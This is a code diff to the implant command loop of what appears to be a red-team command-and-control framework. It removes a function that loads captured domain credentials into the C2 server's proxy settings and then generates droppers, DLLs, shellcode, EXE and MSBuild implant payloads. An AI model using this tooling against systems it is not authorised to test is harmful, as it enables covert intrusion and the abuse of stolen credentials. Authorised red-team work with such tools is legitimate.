@@ -207,7 +207,7 @@ def implant_handler_command_loop(user, printhelp="", autohide=None):
                 do_createdaisypayload(user, command)
                 continue
             if command.startswith("createproxypayload"):
-                do_createproxypayload(user, command)
+                do_createnewpayload(user, command)
                 continue
             if command.startswith("createnewpayload"):
                 do_createnewpayload(user, command)
@@ -298,6 +298,8 @@ def implant_command_loop(implant_id, user):
                 implant = get_implantbyid(implant_id)
                 if not implant:
                     print_bad("Unrecognised implant id or command: %s" % implant_id)
+                    input("Press Enter to continue...")
+                    clear()
                     return
                 prompt_commands = COMMANDS
                 if implant.Pivot == 'Python':
@@ -734,7 +736,7 @@ def do_createnewpayload(user, command, creds=None, shellcodeOnly = False):
             clear()
             return
 
-    name = input(Colours.GREEN + "Proxy Payload Name: e.g. Scenario_One ")
+    name = input(Colours.GREEN + "Payload Name: e.g. Scenario_One ")
     comms_url = input("Comms URL: https://www.example.com ")
     domain = (comms_url.lower()).replace('https://', '')
     domain = domain.replace('http://', '')
@@ -772,46 +774,6 @@ def do_createnewpayload(user, command, creds=None, shellcodeOnly = False):
         newPayload.CreateCS("%s_" % name)
 
     print_good("Created new payloads")
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_createproxypayload(user, command, creds=None):
-    params = re.compile("createproxypayload ", re.IGNORECASE)
-    params = params.sub("", command)
-    creds = None
-    if "-credid" in params:
-        creds, params = get_creds_from_params(params, user)
-        if creds is None:
-            return
-        if not creds['Password']:
-            print_bad("This command does not support credentials with hashes")
-            input("Press Enter to continue...")
-            clear()
-            return
-    if creds is not None:
-        proxyuser = "%s\\%s" % (creds['Domain'], creds['Username'])
-        proxypass = creds['Password']
-    else:
-        proxyuser = input(Colours.GREEN + "Proxy User: e.g. Domain\\user ")
-        proxypass = input("Proxy Password: e.g. Password1 ")
-    proxyurl = input(Colours.GREEN + "Proxy URL: .e.g. http://10.150.10.1:8080 ")
-    credsexpire = input("Password/Account Expiration Date: .e.g. 15/03/2018 ")
-    update_item("ProxyURL", "C2Server", proxyurl)
-    update_item("ProxyUser", "C2Server", proxyuser)
-    update_item("ProxyPass", "C2Server", proxypass)
-    C2 = get_c2server_all()
-    urlId = new_urldetails("Proxy", C2.PayloadCommsHost, C2.DomainFrontHeader, proxyurl, proxyuser, proxypass, credsexpire)
-    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer,
-        "%s?p" % get_newimplanturl(), PayloadsDirectory, URLID=urlId)
-    newPayload.CreateRaw("Proxy")
-    newPayload.CreateDroppers("Proxy")
-    newPayload.CreateDlls("Proxy")
-    newPayload.CreateShellcode("Proxy")
-    newPayload.CreateEXE("Proxy")
-    newPayload.CreateMsbuild("Proxy")
-    newPayload.CreateCS("Proxy")
-    print_good("Created new proxy payloads")
     input("Press Enter to continue...")
     clear()
 
